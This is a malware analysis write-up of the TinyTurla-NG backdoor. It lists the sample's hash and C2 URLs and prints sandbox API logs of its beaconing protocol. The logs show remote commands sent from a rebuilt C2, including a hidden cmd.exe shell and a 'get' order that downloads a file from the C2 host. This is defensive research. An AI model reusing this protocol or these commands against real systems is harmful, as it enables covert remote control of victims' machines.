---
title: "TinyTurla"
date: 2025-03-03
---

<link rel="stylesheet" href="/css/main.css">

## TinyTurla

## Context  

SHA256 : 267071DF79927ABD1E57F57106924DD8A68E1C4ED74E7B69403CDCDF6E6A453B  
sample source : [bazaar.abuse.ch](https://bazaar.abuse.ch/sample/267071df79927abd1e57f57106924dd8a68e1c4ed74e7b69403cdcdf6e6a453b/)  
VT : [virustotal](https://www.virustotal.com/gui/file/267071df79927abd1e57f57106924dd8a68e1c4ed74e7b69403cdcdf6e6a453b)  
Report: <https://blog.talosintelligence.com/tinyturla-next-generation/>  


C2 :  
https://thefinetreats.com/wp-content/themes/twentyseventeen/rss-old.php  
https://hanagram.jp/wp/wp-content/themes/hanagram/rss-old.php  

Analyzed sample is a 64bit Service DLL attributed to TURLA by TALOS and named TinyTurla-NG.

As usual, results from dynamic analysis are shared in my repository ([logs](https://github.com/cedricg-mirror/reflexions/blob/main/APT/TURLA/TinyTurla/267071DF79927ABD1E57F57106924DD8A68E1C4ED74E7B69403CDCDF6E6A453B/logs.txt))  

**Commentary**

Analysed sample is already well described in the TALOS report so I won't go into details.  
For this analysis, I chose to rebuild a small C2 and order the malware to execute the following commands while supervised by my sandbox :  

- dir C:\users  
- get https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt Liberty.txt

---

First Beaconing to a reachable C2 :  

```html
[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x5f6d55b0
[PAR] LPCWSTR   pwszVerb          : 0x000000E45FF8F508
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x000000E46048E780
[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff33b8bc26 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpSendRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest         : 0x000000E45F62CE30
[PAR] LPCWSTR   pwszHeaders      : 0x000000E46048ECC0
[STR]           -> "Content-Type: multipart/form-data; boundary="-""
[PAR] DWORD     dwHeadersLength  : 0xffffffff
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[PAR] DWORD     dwTotalLength    : 0xbe
[RET] 0x7fff33b8d38b in [tinyturla.dll]

Thread created by monitored process : Now monitoring [pid 0x250][tid 0xb58]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000E45F62CE30
[PAR] LPCVOID   lpBuffer                 : 0x000000E45F6567E0
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="result""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "Client Ready" <--- Ready for buisiness>
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0xbe
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000E45FF8F560
[RET] 0x7fff33b8d3f2 in [tinyturla.dll]
```

As mentionned in the report the first beaconing contains the "Client Ready" message to signal the C2 that the is malware is up and ready to receive orders.  

---  

With the following 'gettask' message, the malware is offering the C2 an opportunity to reply with an order :  

```html
[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x60669e70
[PAR] LPCWSTR       pswzServerName : 0x000000E460682320
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff33b8bb16 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x5f6d5190
[PAR] LPCWSTR   pwszVerb          : 0x000000E45FF8F5C8
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x000000E46069B0C0
[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff33b8bc26 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpSendRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest         : 0x000000E4606849C0
[PAR] LPCWSTR   pwszHeaders      : 0x000000E46069AB10
[STR]           -> "Content-Type: multipart/form-data; boundary="-""
[PAR] DWORD     dwHeadersLength  : 0xffffffff
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[PAR] DWORD     dwTotalLength    : 0xaf
[RET] 0x7fff33b8d38b in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000E4606849C0
[PAR] LPCVOID   lpBuffer                 : 0x000000E45F6C4490
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="gettask""  <--- your wish is my command>
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000E45FF8F620
[RET] 0x7fff33b8d3f2 in [tinyturla.dll]
```
---  

# First command : DIR  

I've chosen to make the malware execute the following command : 'rsp: dir c:\users'   
Which triggered the following behavior :  

Note that the thread executing the command **[tid 0x410]** is not the one sending the result back to the C2 **[tid 0x990]**  
Basicaly, one thread is in charge of querying orders and reporting back to the C2 while another is in charge of executing the orders.  

```html
[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpQueryDataAvailable> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                   : 0x606849c0
[PAR] LPDWORD   lpdwNumberOfBytesAvailable : 0x000000E45FF8F640
[RET] 0x7fff33b8b7ef in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpReadData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest              : 0x606849c0
[PAR] LPVOID    lpBuffer              : 0x000000E46068D310
[PAR] DWORD     dwNumberOfBytesToRead : 0x10
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000E45FF8F644
[RET] 0x7fff33b8b844 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpReadData>
[PAR] LPCVOID lpBuffer : 0x000000E46068D310
[STR]         -> "rsp:dir c:\users" <--- command received>
[RES] BOOL 0x1

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <SetEvent> in [KERNEL32.DLL] 
[PAR] HANDLE   hEvent : 0x60            <--- Signaling thread 0x410 that an order is awaiting to be executed>
[RET] 0x7fff33b84f5f in [tinyturla.dll]

[...]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <CreatePipe> in [KERNEL32.DLL] 
[PAR] PHANDLE               hReadPipe        : 0x000000E4600DF890
[PAR] PHANDLE               hWritePipe       : 0x000000E4600DF880
[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000E4600DF8A8
[PAR] DWORD                 nSize            : 0xdcd8
[RET] 0x7fff33b845fb in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <CreatePipe>
[PAR] HANDLE  hReadPipe  : 0x924
[PAR] HANDLE  hWritePipe : 0x934
[RES] BOOL 0x1

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <CreatePipe> in [KERNEL32.DLL] 
[PAR] PHANDLE               hReadPipe        : 0x000000E4600DF898
[PAR] PHANDLE               hWritePipe       : 0x000000E4600DF888
[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x000000E4600DF8A8
[PAR] DWORD                 nSize            : 0xa00000
[RET] 0x7fff33b8461e in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <CreatePipe>
[PAR] HANDLE  hReadPipe  : 0x944
[PAR] HANDLE  hWritePipe : 0x940
[RES] BOOL 0x1

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <CreateProcessA> in [KERNEL32.DLL] 
[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
[PAR] LPCTSTR               lpCommandLine        : 0x00007FFF33BB0888
[STR]                       -> "C:\Windows\System32\cmd.exe"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
[PAR] BOOL                  bInheritHandles      : 0x1
[PAR] DWORD                 dwCreationFlags      : 0x8000000 (CREATE_NO_WINDOW)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x000000E4600DF8E0
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x924    <--- hReadPipe created above>
[FLD]                       -> hStdOutput  = 0x940    <--- hWritePipe created above>
[FLD]                       -> hStdError   = 0x940
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000E4600DF8C0
[RET] 0x7fff33b846b0 in [tinyturla.dll]

[...]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000E460685800
[PAR] LPCVOID   lpBuffer                 : 0x000000E4601A7F70
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="result""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              ""
[STR]              "Microsoft Windows [version 6.3.9600]"
[STR]              "(c) 2013 Microsoft Corporation. Tous droits r‚serv‚s."
[STR]              ""
[STR]              "C:\Windows\system32>chcp 437 > NUL"
[STR]              ""
[STR]              "C:\Windows\system32>dir c:\users"
[STR]              " Le volume dans le lecteur C n'a pas de nom."
[STR]              " Le num‚ro de s‚rie du volume est 689B-5BB9"
[STR]              ""
[STR]              " R‚pertoire de c:\users"
[STR]              ""
[STR]              "21/10/2024  23:42    <DIR>          ."
[STR]              "21/10/2024  23:42    <DIR>          .."
[STR]              "22/08/2013  16:36    <DIR>          Public"
[STR]              "03/03/2025  14:32    <DIR>          user"
[STR]              "               0 fichier(s)                0 octets"
[STR]              "               4 R‚p(s)  47ÿ973ÿ212ÿ160 octets libres"
[STR]              ""
[STR]              "C:\Windows\system32>exit"
[STR]              ""
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x2fc
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000E45FF8F640
[RET] 0x7fff33b8d3f2 in [tinyturla.dll]

```

As one can see, the malware is forcing the code page 437 (suitable for English / German / Swedish) to be used.

---  

# Second command : GET Remote File  

I've chosen to make the malware download and save a a little poem through the following order :  

get https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt Liberty.txt

which triggered the following behavior :  

```html
[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpReadData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest              : 0x60685470
[PAR] LPVOID    lpBuffer              : 0x000000E4601B88B0
[PAR] DWORD     dwNumberOfBytesToRead : 0x4e
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000E45FF8F644
[RET] 0x7fff33b8b844 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpReadData>
[PAR] LPCVOID lpBuffer : 0x000000E4601B88B0
[STR]         -> "rsp:get https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt Liberty.txt"
[RES] BOOL 0x1

[...]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x60669e70
[PAR] LPCWSTR       pswzServerName : 0x000000E460681B70
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff33b8bb16 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x5f6d4d70
[PAR] LPCWSTR   pwszVerb          : 0x000000E4600DF6A8
[STR]           -> "GET"
[PAR] LPCWSTR   pwszObjectName    : 0x000000E4601B88B0
[STR]           -> "/wp/wp-content/The%20New%20Colossus.txt"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff33b8bc26 in [tinyturla.dll]

[...]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <WinHttpReadData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest              : 0x60685b90
[PAR] LPVOID    lpBuffer              : 0x000000E4606A1650
[PAR] DWORD     dwNumberOfBytesToRead : 0x1000
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000E4600DF7C0
[RET] 0x7fff33b8c020 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <WinHttpReadData>
[PAR] LPCVOID lpBuffer : 0x000000E4606A1650
[STR]         -> "Not like the brazen giant of Greek fame,"
[STR]            "With conquering limbs astride from land to land;"
[STR]            "Here at our sea-washed, sunset gates shall stand"
[STR]            "A mighty woman with a torch, whose flame"
[STR]            "Is the imprisoned lightning, and her name"
[STR]            "Mother of Exiles. From her beacon-hand"
[STR]            "Glows world-wide welcome; her mild eyes command"
[STR]            "The air-bridged harbor that twin cities frame."
[STR]            ""
[STR]            ""Keep, ancient lands, your storied pomp!" cries she"
[STR]            "With silent lips. "Give me your tired, your poor,"
[STR]            "Your huddled masses yearning to breathe free,"
[STR]            "The wretched refuse of your teeming shore."
[STR]            "Send these, the homeless, tempest-tost to me,"
[STR]            "I lift my lamp beside the golden door!""
[STR]            ""
[RES] BOOL 0x1

[...]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <CreateFileA> in [KERNEL32.DLL] 
[PAR] LPCTSTR lpFileName            : 0x000000E46069B100
[STR]         -> "Liberty.txt"
[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
[RET] 0x7fff33b86a18 in [tinyturla.dll]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[EVT] [Kernel Monitoring]
[MSG] [FILE_CREATED] [Liberty.txt]

[ * ] [pid 0x250][tid 0x410] c:\windows\system32\svchost.exe
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x910
[PAR] LPVOID       lpBuffer               : 0x000000E4601A7030
[PAR] DWORD        nNumberOfBytesToWrite  : 0x27b
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x000000E4600DF870
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] 0x7fff33b86a45 in [tinyturla.dll]
```

Once the file has downloaded succesfuly, the malware reports back to the C2 :  

```html
[ * ] [pid 0x250][tid 0x990] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000E4606849C0
[PAR] LPCVOID   lpBuffer                 : 0x000000E45F62E170
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="result""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "[+] File https://hanagram.jp/wp/wp-content/The%20New%20Colossus.txt loaded and saved in Liberty.txt"   <--- download succesful>
[STR]              ""
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x360
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000E45FF8F640
[RET] 0x7fff33b8d3f2 in [tinyturla.dll]
```


